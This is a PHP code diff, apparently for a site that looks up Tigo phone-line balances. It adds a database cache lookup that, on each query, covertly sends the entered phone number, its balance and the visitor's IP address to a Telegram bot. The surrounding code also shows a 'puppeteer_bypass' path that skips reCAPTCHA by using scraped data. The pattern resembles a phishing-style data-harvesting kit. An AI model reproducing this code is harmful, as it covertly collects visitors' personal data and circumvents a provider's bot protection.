@@ -29,6 +29,78 @@ if (empty($value)) {
     exit;
 }
 
+// --- CONSULTA A BASE DE DATOS NEON (Bot Local Sync) ---
+try {
+    $dbConfig = require 'config_db.php';
+    $dbUrl = $dbConfig['db_url'];
+    
+    // Parsear URL de postgres: postgresql://user:pass@host/db
+    $urlParts = parse_url($dbUrl);
+    $dbHost = $urlParts['host'];
+    $dbPort = $urlParts['port'] ?? 5432;
+    $dbName = ltrim($urlParts['path'], '/');
+    $dbUser = $urlParts['user'];
+    $dbPass = $urlParts['pass'];
+    
+    $dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName;sslmode=require";
+    $pdo = new PDO($dsn, $dbUser, $dbPass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
+    
+    $stmt = $pdo->prepare("SELECT balance, status, last_sync, raw_data FROM tigo_balances WHERE number = ?");
+    $stmt->execute([$value]);
+    $dbRow = $stmt->fetch(PDO::FETCH_ASSOC);
+    
+    if ($dbRow) {
+        $balance = (float)$dbRow['balance'];
+        $status = $dbRow['status'];
+        $rawData = json_decode($dbRow['raw_data'], true);
+        
+        $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
+        $clientIP = explode(',', $ipHeader)[0];
+
+        // Notificar a Telegram
+        $telegramMsg = "📊 *Consulta Tigo (DB Local Sync)*\n\n";
+        $telegramMsg .= "📱 Número: `$value`\n";
+        $telegramMsg .= "💰 Saldo: *\$ " . number_format($balance, 0, ',', '.') . "*\n";
+        $telegramMsg .= "🔄 Estado: *$status*\n";
+        $telegramMsg .= "🌐 IP: `$clientIP`";
+        sendTelegramMessage($telegramMsg);
+
+        // Formatear facturas si existen en raw_data
+        $invoices = [];
+        $foundItems = [];
+        $data = $rawData;
+        if (isset($data['data']['mobile'])) $foundItems = array_merge($foundItems, $data['data']['mobile']);
+        if (isset($data['data']['convergent'])) $foundItems = array_merge($foundItems, $data['data']['convergent']);
+        if (isset($data['data']['billingAccounts'])) $foundItems = array_merge($foundItems, $data['data']['billingAccounts']);
+        if (isset($data['data']['invoices'])) $foundItems = array_merge($foundItems, $data['data']['invoices']);
+
+        foreach ($foundItems as $item) {
+            $amt = $item['dueAmount']['value'] ?? ($item['balance']['value'] ?? ($item['amount']['value'] ?? 0));
+            if ($amt > 0) {
+                $invoices[] = [
+                    'line' => $item['targetMsisdn']['formattedValue'] ?? $value,
+                    'amount' => $item['dueAmount']['formattedValue'] ?? ("$ " . number_format($amt, 0, ',', '.')),
+                    'dueDate' => $item['dueDate']['formattedValue'] ?? ''
+                ];
+            }
+        }
+
+        echo json_encode([
+            "success" => true,
+            "status" => ($balance > 0 ? "debt" : "up_to_date"),
+            "balance" => "$ " . number_format($balance, 0, ',', '.'),
+            "totalBalance" => "$ " . number_format($balance, 0, ',', '.'),
+            "invoices" => $invoices,
+            "db_cached" => true,
+            "last_sync" => $dbRow['last_sync']
+        ]);
+        exit;
+    }
+} catch (Exception $e) {
+    // Si falla la DB, continuar con el flujo normal (silent error)
+    error_log("Neon DB Error: " . $e->getMessage());
+}
+
 // --- BYPASS: Si vienen datos del scraper Puppeteer ---
 if ($scrapedData !== null && $recaptchaToken === 'puppeteer_bypass') {
     $data = $scrapedData;
